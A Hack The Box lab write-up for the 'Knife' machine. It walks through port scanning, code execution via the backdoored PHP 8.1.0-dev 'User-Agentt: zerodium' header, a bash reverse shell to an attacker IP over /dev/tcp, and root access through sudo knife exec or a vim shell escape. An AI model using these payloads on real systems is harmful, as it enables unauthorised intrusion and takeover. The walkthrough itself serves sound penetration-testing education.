# HTB: Knife

## 📌 Box Info
- **Name:** Knife
- **IP:** 10.10.10.242
- **OS:** [Linux](Linux)
- **Difficulty:** Easy

---

## 🔍 Recon
```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.242
nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.242
```

---

## 🖼️ Web Enumeration
```bash
# Server response shows:
# X-Powered-By: PHP/8.1.0-dev

# Directory fuzzing:
feroxbuster -u http://10.10.10.242 -o scans/feroxbuster-root-php
```

---

## ⚔️ [PHP Backdoor RCE (CVE-2021-XXXXX)](HTTP)
```http
# Send request with User-Agentt: zerodium
# PHP code in header gets executed.

GET / HTTP/1.1
Host: 10.10.10.242
User-Agentt: zerodium system('id');
```

---

## 🚀 Reverse Shell
```bash
# On attacker machine:
nc -lnvp 443

# In Burp / curl:
User-Agentt: zerodium system('bash -c "bash -i >& /dev/tcp/10.10.14.15/443 0>&1"');
```

### Shell Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
reset
export TERM=screen
```

---

## 🔎 Enumeration (as james)
```bash
whoami
hostname
sudo -l
```

---

## 🔒 Privilege Escalation via `knife`
```bash
# Check sudo rights:
sudo -l
# Output: (root) NOPASSWD: /usr/bin/knife
```

### Method 1: GTFObins - `knife exec`
```bash
sudo knife exec -E "exec '/bin/bash'"
```

### Method 2: Vim Escape
```bash
sudo knife data bag create test output -e vim
# In vim: :!/bin/bash
```

---

## ✅ Flags
```bash
cat /home/james/user.txt
cat /root/root.txt
```

---

## 📋 Resources
- [PHP Backdoor Info](https://news-web.php.net/php.internals/113838)
- [GTFObins - knife](https://gtfobins.github.io/gtfobins/knife/)
- [PHP 8.1.0-dev CVE Threads](https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-insert-secret-backdoor-to-php-source-code/)

